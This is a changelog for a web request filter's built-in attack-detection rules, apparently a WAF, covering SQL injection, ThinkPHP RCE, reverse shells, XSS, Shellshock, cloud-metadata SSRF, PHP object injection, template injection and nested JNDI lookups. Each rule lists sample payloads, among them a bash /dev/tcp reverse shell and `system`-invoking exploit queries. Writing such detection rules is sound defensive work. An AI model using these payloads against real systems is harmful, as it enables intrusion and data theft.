# Changes to the built-in rules

The rule files in this directory are read by every site (`scanners.rules`) or
on request (`wordpress.rules`: `include @wordpress`; `attacks.rules`:
`include @attacks`). Each file has a
`version`; each rule a revision (`[SCAN-BACKUP@1]`), raised when the rule
changes what it matches. A site that takes back, replaces or opens a rule and
names the revision it reviewed (`unblock [SCAN-BACKUP@1] at /downloads/**`) is
warned by `bin/request-shield check` and the active rules page when the
revision here is newer — the rule itself applies at once.

## 2026.10.2

`attacks.rules` (`include @attacks`):

| Rule | Revision | Matches |
|---|---|---|
| `ATK-SQL-FUNC` | 1 (new) | SQL injection through the database's own functions: `extractvalue(`, `updatexml(`, `load_file(`, `into outfile '…'` / `into dumpfile '…'`, `@@version` and other server variables (also `@@global.…`, `@@session.…`), `xp_cmdshell`. The words alone ("load file into outfile tutorial") pass. |
| `ATK-SQL-BOOL` | 1 (new) | SQL injection without quotes: `or 1=1`, `and 6522=6522` (sqlmap's boolean test), also `1/**/or/**/1=1`. "rock and roll 2=2" and "a or 1=2" pass; "and 2024=2024" does not. |
| `ATK-PHP` | 2 | also ThinkPHP's way into its own code: `think\` (no letter before it) and one of the classes its exploits name -- `app`, `container`, `request`, `template`, `view`, `module`, `config` -- in the query (`?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system`, `index/think\Container/…`, `\think\request/input&filter=system`, `\think\template\driver\file/write`, `think\config/get&name=database.password`; CVE-2018-20062 and the like, scanned for on every site). `App\Think\Foo`, `rethink\db`, JSON text with `think\n`, a Windows path and the word "invokefunction" pass; the PATH_INFO form in the path is not read. |
| `ATK-SHELL` | 2 | also a reverse shell's `/dev/tcp/<host>/<port>` or `/dev/udp/…` -- `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1`, `exec 5<>/dev/tcp/…/80` -- which revision 1 let pass without a `;` or `|` before it. The device named alone (`bash /dev/tcp tutorial`) passes. |
| `ATK-UA-TOOLS` | 2 | also `feroxbuster`, `arachni`, `whatweb`, `w3af` by their default User-Agent -- and ffuf by the one it sends, "Fuzz Faster U Fool v2…" (revision 1 looked for "ffuf", which ffuf does not send); `dirsearch`, `wafw00f` and `sqlninja` when they send their name (by default dirsearch and wafw00f send a browser's). A name inside a longer word (`nmapper`, `ffuffy`, `my_nmap`) passes. |
| `ATK-XSS-EVENT` | 2 | also after a quoted value that holds a `>` -- `<img title=">" src=x onerror=alert(1)>`: a browser does not end the tag there; revision 1 stopped at it. Everything revision 1 refused stays refused (the first of its two expressions reads as revision 1 did); both stop at the next `<`, so a query full of tags costs about what a plain one does, with PCRE's JIT or without. Not caught: a quoted value with `<` and `>` (`title="<>"`), a quote in a name or in an unquoted value next to a quoted `>` (`x=a" title=">"`); the same for `ATK-XSS-ATTR`. |
| `ATK-XSS-ATTR` | 1 (new) | cross-site scripting through attributes that need no `on…` event: `formaction=` (a button or input that sends the form elsewhere), `xlink:href=` (SVG's link) -- inside a tag only: `<` and a letter, up to its `>` (also past an `&`: `<button x=& formaction=…>` decodes so; and past a quoted `>`: `title=">"`). The words alone and `x < y formaction=1` pass. (`srcdoc` exists on `<iframe>` only, which `ATK-XSS-TAG` refuses.) |
| `ATK-SHELLSHOCK` | 1 (new) | Shellshock in any header but the cookies: a value that starts with `() {` (also `(){`), the Content-Type too -- `() { :; }; id`, `(){ :;};`, `() { _; } >_[…]` (CVE-2014-6278), `() { (a)=>\` (CVE-2014-7169), also percent-encoded -- the form bash runs in a CGI script (bash itself needs `() {` exactly; the variants are refused too, their intent is plain). `() {` inside a value passes (a search for `var f = function () { return x };`). |
| `ATK-SSRF-META` | 1 (new) | a cloud's metadata address in the query (SSRF): `169.254.169.254`, `169.254.170.2`, `100.100.100.200`, `metadata.google.internal`, `fd00:ec2::254` (also written out), `ffff:a9fe:a9fe` (the mapped IPv6 form), and after `//` or `@` as `2852039166`, `0xa9fea9fe`, `0xa9.0xfe.0xa9.0xfe`, `0251.0376.0251.0376` and AWS's `instance-data`. Other link-local addresses and a bare number pass. |
| `ATK-PHP-OBJ` | 1 (new) | a serialised PHP object in the query: `O:8:"stdClass":0:{`, `O:+8:…` (sent as `%2B`), a sign or leading zeros on the count of properties (`:+0:{`), `C:…`, also inside an array -- the way into `unserialize()` gadget chains. A serialised array without an object passes. |
| `ATK-SSTI` | 1 (new) | template injection in the query: `{{` … `*`, `__`, `(` or `_self` … `}}` -- `{{7*7}}`, `{{_self.env…}}` (Twig), `{{''.__class__}}` (Jinja). A plain placeholder (`{{ user.name }}`) passes. |
| `ATK-JNDI` | 2 | also a lookup inside a lookup -- `${${lower:j}ndi:…}`, `${${upper:j}${upper:n}di:…}` -- and the lookups `lower:`, `upper:`, `ctx:`, `main:`, `spring:`; revision 1 let the nested ones through. Two placeholders side by side (`${amount} of ${count}`) still pass. |

The attack rules also see the body of MySQL's versioned comments
(`/*!50000UNION*/`): the value they are matched against changed, no rule did.

## 2026.10.1

No rule changed what it matches (no revision raised). `scanners.rules` and
`wordpress.rules` carry examples next to their rules (`expect` lines,
[proposal 0029](../docs/proposals/0029-rule-examples.md)): what each rule
refuses, and near misses it must let through. `bin/request-shield test`
decides them, together with a site's own examples.

## 2026.09.1
